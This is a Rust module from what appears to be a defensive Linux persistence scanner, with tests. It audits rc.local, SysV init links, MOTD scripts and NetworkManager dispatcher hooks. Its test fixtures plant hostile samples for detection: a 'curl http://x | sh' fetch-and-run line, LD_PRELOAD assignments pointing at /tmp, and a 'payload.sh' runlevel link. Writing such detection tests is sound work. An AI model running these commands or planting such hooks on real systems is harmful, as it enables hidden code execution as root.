//! Pre-systemd and boot-adjacent execution: rc.local, the SysV init scripts
//! with their runlevel links, update-motd.d, and NetworkManager's dispatcher
//! hooks (§5).
//!
//! One collector because all four are the same material — a root-owned script
//! that some supervisor executes — and the same question is asked of each:
//! does anything actually run it? For SysV that question is the whole job. A
//! script in /etc/init.d runs only when an S-link in some /etc/rc?.d points at
//! it, which is the SysV shape of the `.wants` problem systemd has, and
//! treating presence in init.d as enablement is the defect this avoids.

use std::collections::{BTreeMap, BTreeSet};
use std::ffi::OsStr;
use std::os::unix::ffi::OsStrExt;
use std::path::{Component, Path, PathBuf};

use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, hex, name_from_os};
use crate::scan::{Collector, Ctx};

pub struct InitScripts;

/// init, pam_motd and NetworkManager all run as root, so everything below
/// them does too.
const ROOT: &str = "root";

const RC_LOCAL: &[&str] = &["etc/rc.local", "etc/rc.d/rc.local", "etc/rc.local.shutdown"];

/// /etc/init.d is a symlink to /etc/rc.d/init.d on the rpm distributions, so
/// these two names are one directory there and two on Debian.
const INIT_DIRS: &[&str] = &["etc/init.d", "etc/rc.d/init.d"];

const RUNLEVELS: &[&str] = &["0", "1", "2", "3", "4", "5", "6", "S"];

const MOTD_DIR: &str = "etc/update-motd.d";

const NM_DIRS: &[&str] = &[
    "etc/NetworkManager/dispatcher.d",
    "usr/lib/NetworkManager/dispatcher.d",
    "lib/NetworkManager/dispatcher.d",
];

/// Subdirectories of dispatcher.d, each a different moment in an interface
/// state change at which NetworkManager runs what it finds.
const NM_PHASES: &[&str] = &["pre-up.d", "pre-down.d", "no-wait.d"];

/// How far into a script the head scan reads. Recorded on every entry it
/// touches, so a clean scan is never mistaken for a whole-file one.
const SCAN_LINES: usize = 200;

impl Collector for InitScripts {
    fn name(&self) -> &'static str {
        "initscripts"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = rc_local(cx);
        out.extend(sysv(cx));
        out.extend(motd(cx));
        out.extend(dispatcher(cx));
        out
    }
}

// ------------------------------------------------------------ rc.local ----

fn rc_local(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    for rel in RC_LOCAL {
        let rel = Path::new(rel);
        let Ok(meta) = cx.root.stat(rel) else { continue };
        if meta.is_dir {
            continue;
        }
        let name = rel.file_name().unwrap_or_else(|| OsStr::new("rc.local"));
        let mut e = script_entry(cx, Kind::RcLocal, rel, name, Trigger::Boot);
        // systemd's rc-local.service carries ConditionFileIsExecutable and
        // Debian's own /etc/init.d/rc.local tests -x: without the bit the
        // file is inert no matter what it contains.
        let exec = exec_mode(cx, rel) != 0;
        e.enabled = if exec { Enablement::Enabled } else { Enablement::Disabled };
        e.note("executable", exec.to_string());
        out.push(e);
    }
    out
}

// ---------------------------------------------------------------- SysV ----

/// What the rc?.d links say about one init.d script.
#[derive(Default)]
struct Links {
    start: BTreeSet<String>,
    stop: BTreeSet<String>,
    priority: BTreeSet<String>,
}

fn sysv(cx: &mut Ctx) -> Vec<Entry> {
    let init_dirs = distinct_dirs(cx, INIT_DIRS.iter().map(|d| ((), PathBuf::from(*d))).collect());
    let init_ids: BTreeSet<(u64, u64)> = init_dirs.iter().map(|(_, id, _)| *id).collect();

    let mut scripts: Vec<Entry> = Vec::new();
    let mut links: Vec<Links> = Vec::new();
    let mut index: BTreeMap<((u64, u64), Vec<u8>), usize> = BTreeMap::new();

    for (_, id, dir) in &init_dirs {
        for ent in cx.dir(dir) {
            // insserv writes .depend.boot, .depend.start and .depend.stop as
            // caches of the dependency graph; nothing executes them.
            if ent.is_dir || ent.name.as_bytes().starts_with(b".depend.") {
                continue;
            }
            let rel = dir.join(&ent.name);
            let e = script_entry(cx, Kind::SysvInit, &rel, &ent.name, Trigger::Boot);
            index.insert((*id, ent.name.as_bytes().to_vec()), scripts.len());
            scripts.push(e);
            links.push(Links::default());
        }
    }

    let candidates = RUNLEVELS
        .iter()
        .flat_map(|lvl| {
            [PathBuf::from(format!("etc/rc{lvl}.d")), PathBuf::from(format!("etc/rc.d/rc{lvl}.d"))]
                .map(|d| ((*lvl).to_string(), d))
        })
        .collect();

    let mut out = Vec::new();
    for (level, _, dir) in distinct_dirs(cx, candidates) {
        for ent in cx.dir(&dir) {
            let raw = ent.name.as_bytes();
            // /etc/init.d/rc globs S* and K*; anything else in the directory
            // is never run, whatever it is.
            let starts = match raw.first() {
                Some(b'S') => true,
                Some(b'K') => false,
                _ => continue,
            };
            if ent.is_dir {
                continue;
            }
            let digits = raw[1..].iter().take_while(|b| b.is_ascii_digit()).count();
            let priority = String::from_utf8_lossy(&raw[1..1 + digits]).into_owned();
            let rel = dir.join(&ent.name);

            // Resolution is left to the kernel rather than done lexically: on
            // a distribution where /etc/rc2.d is itself a symlink, `..` in the
            // link target does not mean what the text says it means.
            let target = if ent.is_symlink { cx.root.read_link(&rel).ok() } else { None };
            let joined = target.as_ref().map(|t| dir.join(t));
            let parent_id = joined
                .as_deref()
                .and_then(Path::parent)
                .and_then(|p| cx.root.dir_identity(p).ok());
            let script = match (parent_id, joined.as_deref().and_then(Path::file_name)) {
                (Some(id), Some(base)) => index.get(&(id, base.as_bytes().to_vec())).copied(),
                _ => None,
            };

            match script {
                Some(i) => {
                    let l = &mut links[i];
                    if starts {
                        l.start.insert(level.clone());
                        if !priority.is_empty() {
                            l.priority.insert(priority);
                        }
                    } else {
                        l.stop.insert(level.clone());
                    }
                }
                None => {
                    // A runlevel link naming something outside init.d is not a
                    // bookkeeping detail: it is code the runlevel starts from
                    // a place nobody enumerates.
                    let mut e = script_entry(cx, Kind::SysvInit, &rel, &ent.name, Trigger::Boot);
                    e.enabled =
                        if starts { Enablement::Enabled } else { Enablement::Disabled };
                    e.note("runlevel", level.clone());
                    e.note("action", if starts { "start" } else { "stop" });
                    if !priority.is_empty() {
                        e.note("priority", priority);
                    }
                    if !parent_id.is_some_and(|id| init_ids.contains(&id)) {
                        e.note("outside_init_d", "true");
                    }
                    if !ent.is_symlink {
                        e.note("not_a_symlink", "true");
                    }
                    if let Some(j) = &joined {
                        e.target_path = Some(cx.root.abs(normalize(j)));
                    }
                    out.push(e);
                }
            }
        }
    }

    for (i, mut e) in scripts.into_iter().enumerate() {
        let l = &links[i];
        // The whole point: an S-link somewhere is enablement, sitting in
        // init.d is not.
        e.enabled = if l.start.is_empty() { Enablement::Disabled } else { Enablement::Enabled };
        for (key, set) in
            [("start_runlevels", &l.start), ("stop_runlevels", &l.stop), ("start_priority", &l.priority)]
        {
            if !set.is_empty() {
                e.note(key, set.iter().cloned().collect::<Vec<_>>().join(", "));
            }
        }
        out.push(e);
    }
    out
}

/// `### BEGIN INIT INFO` ... `### END INIT INFO`. Continuation lines — a bare
/// `#` followed by more dependencies — are dropped rather than merged; they
/// are rare and guessing at them would invent facts.
fn lsb_header(e: &mut Entry, bytes: &[u8]) {
    let mut inside = false;
    for line in bytes.split(|b| *b == b'\n').take(SCAN_LINES) {
        let t = line.strip_suffix(b"\r").unwrap_or(line).trim_ascii();
        if t.starts_with(b"###") && t.ends_with(b"BEGIN INIT INFO") {
            inside = true;
            continue;
        }
        if !inside {
            continue;
        }
        if t.ends_with(b"END INIT INFO") {
            break;
        }
        let Some(rest) = t.strip_prefix(b"#") else { continue };
        let Some(colon) = rest.iter().position(|b| *b == b':') else { continue };
        let key = String::from_utf8_lossy(rest[..colon].trim_ascii()).into_owned();
        if !matches!(key.as_str(), "Provides" | "Required-Start" | "Default-Start") {
            continue;
        }
        let value = String::from_utf8_lossy(&rest[colon + 1..]);
        e.note(&format!("lsb.{key}"), value.split_whitespace().collect::<Vec<_>>().join(" "));
    }
}

// ---------------------------------------------------------------- MOTD ----

fn motd(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    for ent in cx.dir(MOTD_DIR) {
        if ent.is_dir {
            continue;
        }
        let rel = Path::new(MOTD_DIR).join(&ent.name);
        let mut e = script_entry(cx, Kind::Motd, &rel, &ent.name, Trigger::Login);
        let exec = exec_mode(cx, &rel) != 0;
        e.enabled = if exec { Enablement::Enabled } else { Enablement::Disabled };
        e.note("executable", exec.to_string());
        out.push(e);
    }
    out
}

// ------------------------------------------------- NetworkManager hooks ----

fn dispatcher(cx: &mut Ctx) -> Vec<Entry> {
    let mut candidates = Vec::new();
    for base in NM_DIRS {
        candidates.push(("dispatch".to_string(), PathBuf::from(*base)));
        for phase in NM_PHASES {
            candidates
                .push((phase.trim_end_matches(".d").to_string(), Path::new(base).join(phase)));
        }
    }

    let mut out = Vec::new();
    for (phase, _, dir) in distinct_dirs(cx, candidates) {
        for ent in cx.dir(&dir) {
            if ent.is_dir {
                continue;
            }
            let rel = dir.join(&ent.name);
            let mut e =
                script_entry(cx, Kind::NetworkDispatcher, &rel, &ent.name, Trigger::NetworkEvent);
            e.note("hook_phase", phase.clone());
            // NetworkManager checks S_IXUSR specifically, not any execute bit.
            let exec = exec_mode(cx, &rel) & 0o100 != 0;
            e.note("executable", exec.to_string());
            let refused = nm_refusal(cx, &rel);
            e.enabled = if exec && refused.is_empty() {
                Enablement::Enabled
            } else {
                Enablement::Disabled
            };
            if !refused.is_empty() {
                e.note("skipped_by_networkmanager", refused.join("; "));
            }
            out.push(e);
        }
    }
    out
}

/// NetworkManager refuses to run a dispatcher script it does not trust. These
/// are its own checks, from nm-dispatcher's check_permissions: a script that
/// fails one is present and inert, and reporting it as enabled would be a lie
/// in the operator's favour.
fn nm_refusal(cx: &Ctx, rel: &Path) -> Vec<&'static str> {
    let mut why = Vec::new();
    match cx.root.stat_follow(rel) {
        Ok(m) => {
            if !m.is_file {
                why.push("not a regular file");
            }
            if m.uid != 0 {
                why.push("not owned by root");
            }
            if m.mode & 0o022 != 0 {
                why.push("writable by group or other");
            }
        }
        Err(_) => why.push("does not resolve to a file"),
    }
    why
}

// -------------------------------------------------------------- shared ----

/// The shape every entry here shares: a script file, its head scanned for the
/// interpreter and the environment a later pass correlates.
fn script_entry(
    cx: &mut Ctx,
    kind: Kind,
    rel: &Path,
    name: &OsStr,
    trigger: Trigger,
) -> Entry {
    let mut e = cx.entry(kind, rel, name.to_string_lossy());
    name_from_os(&mut e, name);
    e.trigger = trigger;
    e.principal = Some(ROOT.to_string());
    // The file is the command; there is no argument vector to record.
    e.target_path = Some(cx.root.abs(rel));
    if cx.root.stat(rel).is_ok_and(|m| m.is_symlink) {
        e.note("is_symlink", "true");
    }
    // Only a regular file is opened. A link pointing at a directory answers
    // EISDIR, which would demote the whole collector to Partial and so make
    // the baseline incomparable (§7); one pointing at a FIFO would block the
    // scan inside open() until somebody wrote to it.
    match cx.root.stat_follow(rel) {
        Ok(m) if m.is_file => script_facts(cx, &mut e, rel),
        Ok(_) => e.note("not_a_regular_file", "true"),
        // Dangling: cx.entry has already recorded it.
        Err(_) => {}
    }
    e
}

fn script_facts(cx: &mut Ctx, e: &mut Entry, rel: &Path) {
    let Some(bytes) = cx.read(rel) else { return };
    e.note("head_scan", format!("first {SCAN_LINES} lines"));
    lsb_header(e, &bytes);

    let mut env: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for (n, line) in bytes.split(|b| *b == b'\n').take(SCAN_LINES).enumerate() {
        let line = line.strip_suffix(b"\r").unwrap_or(line);
        if n == 0 {
            shebang(e, line);
        }
        let Some((k, v)) = env_assignment(line) else { continue };
        if std::str::from_utf8(v).is_err() {
            e.flag(Flag::EncodingAnomaly);
        }
        let slot = env.entry(String::from_utf8_lossy(k).into_owned()).or_default();
        let value = String::from_utf8_lossy(v).into_owned();
        if !slot.contains(&value) {
            slot.push(value);
        }
    }
    for (k, v) in env {
        e.note(&format!("env.{k}"), v.join(", "));
    }
}

fn shebang(e: &mut Entry, line: &[u8]) {
    let Some(rest) = line.strip_prefix(b"#!") else { return };
    let rest = rest.trim_ascii();
    if rest.is_empty() {
        return;
    }
    if std::str::from_utf8(rest).is_err() {
        e.flag(Flag::EncodingAnomaly);
        e.note("shebang_hex", hex(rest));
    }
    let end = rest.iter().position(u8::is_ascii_whitespace).unwrap_or(rest.len());
    e.note("interpreter", String::from_utf8_lossy(&rest[..end]));
    e.note("shebang", String::from_utf8_lossy(rest));
}

/// A leading `NAME=value`, with or without `export`. The name test is what
/// keeps `if [ "$x" = y ]` and `test a=b` out: only a shell-legal identifier
/// standing at the head of the line is an assignment.
fn env_assignment(line: &[u8]) -> Option<(&[u8], &[u8])> {
    let t = line.trim_ascii_start();
    if matches!(t.first(), None | Some(b'#')) {
        return None;
    }
    let t = match t.strip_prefix(b"export ") {
        Some(r) => r.trim_ascii_start(),
        None => t,
    };
    let eq = t.iter().position(|b| *b == b'=')?;
    let name = &t[..eq];
    if name.is_empty() || !(name[0].is_ascii_alphabetic() || name[0] == b'_') {
        return None;
    }
    if !name.iter().all(|b| b.is_ascii_alphanumeric() || *b == b'_') {
        return None;
    }
    let rest = &t[eq + 1..];
    let value = match rest.first() {
        Some(q @ (b'"' | b'\'')) => {
            let end = rest[1..].iter().position(|b| b == q).map_or(rest.len(), |i| i + 1);
            &rest[1..end]
        }
        _ => {
            let end = rest
                .iter()
                .position(|b| b.is_ascii_whitespace() || *b == b';')
                .unwrap_or(rest.len());
            &rest[..end]
        }
    };
    Some((name, value))
}

/// Search paths that are two names for one directory are walked once, so a
/// merged-usr host does not report every script twice under two ids (§5).
fn distinct_dirs<T>(cx: &mut Ctx, candidates: Vec<(T, PathBuf)>) -> Vec<(T, (u64, u64), PathBuf)> {
    let mut seen: BTreeSet<(u64, u64)> = BTreeSet::new();
    let mut out = Vec::new();
    for (label, dir) in candidates {
        match cx.root.dir_identity(&dir) {
            Ok(id) => {
                if seen.insert(id) {
                    out.push((label, id, dir));
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => cx.note_unreadable(format!("{}: {e}", dir.display())),
        }
    }
    out
}

/// Lexical tidying for display only — what the operator would type to reach
/// the link's target. Matching is done against the kernel's answer, not this.
fn normalize(p: &Path) -> PathBuf {
    let mut out: Vec<&OsStr> = Vec::new();
    for c in p.components() {
        match c {
            Component::Normal(n) => out.push(n),
            Component::ParentDir => {
                out.pop();
            }
            _ => {}
        }
    }
    out.into_iter().collect()
}

fn exec_mode(cx: &Ctx, rel: &Path) -> u32 {
    cx.root.stat_follow(rel).map_or(0, |m| if m.is_file { m.mode & 0o111 } else { 0 })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status, run};
    use std::fs;
    use std::os::unix::fs::PermissionsExt;

    fn tree(tag: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("unbidden-init-{tag}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&p);
        fs::create_dir_all(&p).unwrap();
        p
    }

    fn put(root: &Path, rel: &str, bytes: &[u8], mode: u32) {
        let p = root.join(rel);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, bytes).unwrap();
        fs::set_permissions(&p, PermissionsExt::from_mode(mode)).unwrap();
    }

    fn link(root: &Path, target: &str, at: &str) {
        let p = root.join(at);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(target, p).unwrap();
    }

    fn scan(dir: &Path) -> Scan {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(InitScripts)];
        run(&root, &Options { deep: false }, &collectors)
    }

    fn status(s: &Scan) -> &Status {
        &s.header.collectors.iter().find(|c| c.name == "initscripts").unwrap().status
    }

    fn of_kind(s: &Scan, kind: Kind) -> Vec<&Entry> {
        s.entries.iter().filter(|e| e.kind == kind).collect()
    }

    fn one<'a>(s: &'a Scan, kind: Kind, name: &str) -> &'a Entry {
        let found: Vec<&Entry> =
            s.entries.iter().filter(|e| e.kind == kind && e.name == name).collect();
        assert_eq!(found.len(), 1, "expected one {kind} named {name}, got {}", found.len());
        found[0]
    }

    const SSH: &[u8] = b"#!/bin/sh\n\
### BEGIN INIT INFO\n\
# Provides:          sshd ssh\n\
# Required-Start:    $remote_fs $syslog\n\
# Default-Start:     2 3 4 5\n\
# Default-Stop:      0 1 6\n\
# Short-Description: OpenBSD Secure Shell server\n\
### END INIT INFO\n\
LD_PRELOAD=/tmp/e.so\n\
export PATH=\"/usr/sbin:/usr/bin\"\n\
if [ \"$x\" = y ]; then :; fi\n\
test a=b\n\
exec /usr/sbin/sshd\n";

    #[test]
    fn presence_in_init_d_is_not_enablement() {
        let dir = tree("sysv");
        put(&dir, "etc/init.d/ssh", SSH, 0o755);
        put(&dir, "etc/init.d/dormant", b"#!/bin/bash\n", 0o755);
        put(&dir, "etc/init.d/.depend.boot", b"TARGETS = x\n", 0o644);
        link(&dir, "../init.d/ssh", "etc/rc2.d/S01ssh");
        link(&dir, "../init.d/ssh", "etc/rc3.d/S01ssh");
        link(&dir, "../init.d/ssh", "etc/rc0.d/K02ssh");
        link(&dir, "../init.d/dormant", "etc/rc6.d/K09dormant");

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let ssh = one(&s, Kind::SysvInit, "ssh");
        assert_eq!(ssh.enabled, Enablement::Enabled, "an S link in any rc?.d enables it");
        assert_eq!(ssh.raw["start_runlevels"], "2, 3");
        assert_eq!(ssh.raw["stop_runlevels"], "0");
        assert_eq!(ssh.raw["start_priority"], "01");
        assert_eq!(ssh.trigger, Trigger::Boot);
        assert_eq!(ssh.principal.as_deref(), Some("root"));
        assert_eq!(ssh.command, None);
        assert_eq!(ssh.target_path, Some(dir.join("etc/init.d/ssh")));

        assert_eq!(ssh.raw["lsb.Provides"], "sshd ssh");
        assert_eq!(ssh.raw["lsb.Required-Start"], "$remote_fs $syslog");
        assert_eq!(ssh.raw["lsb.Default-Start"], "2 3 4 5");
        assert!(!ssh.raw.contains_key("lsb.Short-Description"));

        assert_eq!(ssh.raw["interpreter"], "/bin/sh");
        assert_eq!(ssh.raw["env.LD_PRELOAD"], "/tmp/e.so", "a preload hides in a plain assignment");
        assert_eq!(ssh.raw["env.PATH"], "/usr/sbin:/usr/bin");
        assert!(!ssh.raw.keys().any(|k| k.starts_with("env.test")), "`test a=b` is not an assignment");
        assert_eq!(ssh.raw["head_scan"], "first 200 lines");

        // Default-Start says 2 3 4 5; only links decide, and there are none.
        let dormant = one(&s, Kind::SysvInit, "dormant");
        assert_eq!(dormant.enabled, Enablement::Disabled);
        assert!(!dormant.raw.contains_key("start_runlevels"));
        assert_eq!(dormant.raw["stop_runlevels"], "6");

        assert!(
            !s.entries.iter().any(|e| e.name == ".depend.boot"),
            "insserv's cache is not a script"
        );
        assert_eq!(of_kind(&s, Kind::SysvInit).len(), 2, "one entry per script, links folded in");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_runlevel_link_leaving_init_d_is_its_own_finding() {
        let dir = tree("outside");
        put(&dir, "etc/init.d/ssh", SSH, 0o755);
        put(&dir, "usr/local/bin/payload.sh", b"#!/usr/bin/perl\n", 0o755);
        link(&dir, "/usr/local/bin/payload.sh", "etc/rc2.d/S99payload");
        // A real file rather than a link: rc runs it just the same.
        put(&dir, "etc/rc3.d/S40inline", b"#!/bin/sh\nBACKDOOR=1\n", 0o755);

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let payload = one(&s, Kind::SysvInit, "S99payload");
        assert_eq!(payload.enabled, Enablement::Enabled);
        assert_eq!(payload.raw["outside_init_d"], "true");
        assert_eq!(payload.raw["runlevel"], "2");
        assert_eq!(payload.raw["priority"], "99");
        assert_eq!(payload.raw["action"], "start");
        assert_eq!(payload.raw["interpreter"], "/usr/bin/perl");
        assert_eq!(payload.target_path, Some(dir.join("usr/local/bin/payload.sh")));

        let inline = one(&s, Kind::SysvInit, "S40inline");
        assert_eq!(inline.raw["not_a_symlink"], "true");
        assert_eq!(inline.raw["env.BACKDOOR"], "1");

        assert_eq!(one(&s, Kind::SysvInit, "ssh").enabled, Enablement::Disabled);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_dangling_runlevel_link_is_reported_not_fatal() {
        let dir = tree("dangling");
        fs::create_dir_all(dir.join("etc/init.d")).unwrap();
        link(&dir, "../init.d/gone", "etc/rc2.d/S02gone");
        link(&dir, "S02gone", "etc/rc2.d/S03loop");
        link(&dir, "/", "etc/rc2.d/S04root");

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let gone = one(&s, Kind::SysvInit, "S02gone");
        assert_eq!(gone.raw["dangling_symlink"], "true");
        assert_eq!(gone.raw["symlink_target"], "../init.d/gone");
        // The target names init.d, it just is not there.
        assert!(!gone.raw.contains_key("outside_init_d"));
        assert_eq!(gone.enabled, Enablement::Enabled, "the runlevel still tries to start it");

        assert!(s.entries.iter().any(|e| e.name == "S03loop"));
        assert_eq!(one(&s, Kind::SysvInit, "S04root").raw["not_a_regular_file"], "true");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn merged_usr_names_for_one_directory_are_walked_once() {
        let dir = tree("merged");
        put(&dir, "etc/rc.d/init.d/ssh", SSH, 0o755);
        fs::create_dir_all(dir.join("etc/rc.d/rc2.d")).unwrap();
        link(&dir, "rc.d/init.d", "etc/init.d");
        link(&dir, "rc.d/rc2.d", "etc/rc2.d");
        link(&dir, "../init.d/ssh", "etc/rc.d/rc2.d/S01ssh");
        put(&dir, "usr/lib/NetworkManager/dispatcher.d/10-hook", b"#!/bin/sh\n", 0o755);
        link(&dir, "usr/lib", "lib");

        let s = scan(&dir);
        let sysv = of_kind(&s, Kind::SysvInit);
        assert_eq!(sysv.len(), 1, "one directory reached by two names is one script");
        assert_eq!(sysv[0].enabled, Enablement::Enabled);
        assert_eq!(sysv[0].raw["start_runlevels"], "2");

        assert_eq!(of_kind(&s, Kind::NetworkDispatcher).len(), 1, "/lib and /usr/lib are one dir");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn rc_local_without_the_execute_bit_does_not_run() {
        let dir = tree("rclocal");
        put(&dir, "etc/rc.local", b"#!/bin/sh\nPATH=/tmp\n/tmp/x\nexit 0\n", 0o644);
        put(&dir, "etc/rc.d/rc.local", b"#!/bin/bash\n/usr/local/bin/y\n", 0o755);
        put(&dir, "opt/shutdown.sh", b"#!/bin/sh\n", 0o755);
        link(&dir, "/opt/shutdown.sh", "etc/rc.local.shutdown");

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));
        assert_eq!(of_kind(&s, Kind::RcLocal).len(), 3, "all three paths are distinct files");

        let inert = s
            .entries
            .iter()
            .find(|e| e.kind == Kind::RcLocal && e.source == dir.join("etc/rc.local"))
            .unwrap();
        assert_eq!(inert.enabled, Enablement::Disabled, "no execute bit, no execution");
        assert_eq!(inert.raw["executable"], "false");
        assert_eq!(inert.command, None);
        assert_eq!(inert.target_path, Some(dir.join("etc/rc.local")));
        assert_eq!(inert.raw["interpreter"], "/bin/sh");
        assert_eq!(inert.raw["env.PATH"], "/tmp");
        assert_eq!(inert.trigger, Trigger::Boot);
        assert_eq!(inert.principal.as_deref(), Some("root"));

        let live = s
            .entries
            .iter()
            .find(|e| e.kind == Kind::RcLocal && e.source == dir.join("etc/rc.d/rc.local"))
            .unwrap();
        assert_eq!(live.enabled, Enablement::Enabled);
        assert_eq!(live.raw["interpreter"], "/bin/bash");

        let shutdown = one(&s, Kind::RcLocal, "rc.local.shutdown");
        assert_eq!(shutdown.raw["is_symlink"], "true");
        assert_eq!(shutdown.raw["symlink_target"], "/opt/shutdown.sh");
        assert_eq!(shutdown.enabled, Enablement::Enabled, "the link resolves to an executable");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn motd_scripts_run_at_every_login() {
        let dir = tree("motd");
        put(&dir, "etc/update-motd.d/10-help-text", b"#!/bin/sh\necho hi\n", 0o755);
        put(&dir, "etc/update-motd.d/99-off", b"#!/bin/sh\nLD_PRELOAD=/tmp/m.so\n", 0o644);

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let live = one(&s, Kind::Motd, "10-help-text");
        assert_eq!(live.enabled, Enablement::Enabled);
        assert_eq!(live.trigger, Trigger::Login);
        assert_eq!(live.principal.as_deref(), Some("root"));
        assert_eq!(live.command, None);
        assert_eq!(live.target_path, Some(dir.join("etc/update-motd.d/10-help-text")));

        let off = one(&s, Kind::Motd, "99-off");
        assert_eq!(off.enabled, Enablement::Disabled);
        assert_eq!(off.raw["env.LD_PRELOAD"], "/tmp/m.so");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_dispatcher_script_networkmanager_refuses_is_not_enabled() {
        let dir = tree("nm");
        let base = "etc/NetworkManager/dispatcher.d";
        put(&dir, &format!("{base}/01-ifupdown"), b"#!/bin/sh\n", 0o755);
        put(&dir, &format!("{base}/99-loose"), b"#!/bin/sh\ncurl http://x | sh\n", 0o777);
        put(&dir, &format!("{base}/pre-up.d/10-early"), b"#!/bin/sh\n", 0o755);
        put(&dir, &format!("{base}/no-wait.d/20-async"), b"#!/bin/sh\n", 0o644);

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let loose = one(&s, Kind::NetworkDispatcher, "99-loose");
        assert_eq!(loose.enabled, Enablement::Disabled, "executable but refused");
        assert!(
            loose.raw["skipped_by_networkmanager"].contains("writable by group or other"),
            "{:?}",
            loose.raw.get("skipped_by_networkmanager")
        );
        assert_eq!(loose.raw["executable"], "true");
        assert_eq!(loose.raw["hook_phase"], "dispatch");
        assert_eq!(loose.trigger, Trigger::NetworkEvent);
        assert!(loose.has_flag(Flag::WorldWritable));

        let tidy = one(&s, Kind::NetworkDispatcher, "01-ifupdown");
        assert!(
            !tidy.raw.get("skipped_by_networkmanager").is_some_and(|r| r.contains("writable")),
            "0755 is not a permission NetworkManager objects to"
        );

        assert_eq!(one(&s, Kind::NetworkDispatcher, "10-early").raw["hook_phase"], "pre-up");
        let async_hook = one(&s, Kind::NetworkDispatcher, "20-async");
        assert_eq!(async_hook.raw["hook_phase"], "no-wait");
        assert_eq!(async_hook.enabled, Enablement::Disabled, "not executable");

        assert_eq!(of_kind(&s, Kind::NetworkDispatcher).len(), 4, "subdirectories are not scripts");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn hostile_scripts_yield_entries_rather_than_a_crash() {
        let dir = tree("hostile");
        let mut huge = b"#!/bin/sh\n".to_vec();
        huge.extend(std::iter::repeat_n(b'x', 10 * 1024 * 1024));
        put(&dir, "etc/init.d/huge", &huge, 0o755);
        link(&dir, "../init.d/huge", "etc/rc2.d/S01huge");

        // A name and a body that are not UTF-8, and an unterminated quote.
        let name = OsStr::from_bytes(b"etc/update-motd.d/50-\xff\xfe");
        let p = dir.join(name);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, b"#!/bin/\xff\xfe\nLD_PRELOAD=\"/tmp/\xfe.so\nBAD=\n").unwrap();
        fs::set_permissions(&p, PermissionsExt::from_mode(0o755)).unwrap();

        put(&dir, "etc/rc2.d/S", b"", 0o755);
        put(&dir, "etc/rc2.d/README", b"not a link\n", 0o644);

        // Opening a FIFO read-only blocks until somebody writes to it. If the
        // regular-file guard ever goes, this test hangs rather than fails,
        // which is precisely the behaviour it exists to prevent.
        rustix::fs::mknodat(
            rustix::fs::CWD,
            dir.join("etc/update-motd.d/60-pipe"),
            rustix::fs::FileType::Fifo,
            rustix::fs::Mode::RUSR | rustix::fs::Mode::XUSR,
            0,
        )
        .unwrap();

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let huge = one(&s, Kind::SysvInit, "huge");
        assert_eq!(huge.enabled, Enablement::Enabled);
        assert_eq!(huge.raw["interpreter"], "/bin/sh");
        assert!(
            s.header.collectors[0].truncated.iter().any(|t| t.contains("huge")),
            "the cap is reported, not hidden"
        );

        assert_eq!(of_kind(&s, Kind::Motd).len(), 2);
        let bad = one(&s, Kind::Motd, "50-\u{fffd}\u{fffd}");
        assert!(bad.has_flag(Flag::EncodingAnomaly), "a non-UTF-8 shebang is evidence");
        assert!(bad.raw.contains_key("shebang_hex"));
        assert_eq!(bad.raw["name_raw_hex"], "35302dfffe");
        assert_eq!(bad.raw["env.LD_PRELOAD"], "/tmp/\u{fffd}.so");
        assert_eq!(bad.raw["env.BAD"], "");

        let pipe = one(&s, Kind::Motd, "60-pipe");
        assert_eq!(pipe.raw["not_a_regular_file"], "true");
        assert_eq!(pipe.enabled, Enablement::Disabled);

        assert!(s.entries.iter().any(|e| e.name == "S"), "a bare S is still an S entry");
        assert!(!s.entries.iter().any(|e| e.name == "README"), "rc runs S* and K* only");
        fs::remove_dir_all(&dir).unwrap();
    }
}
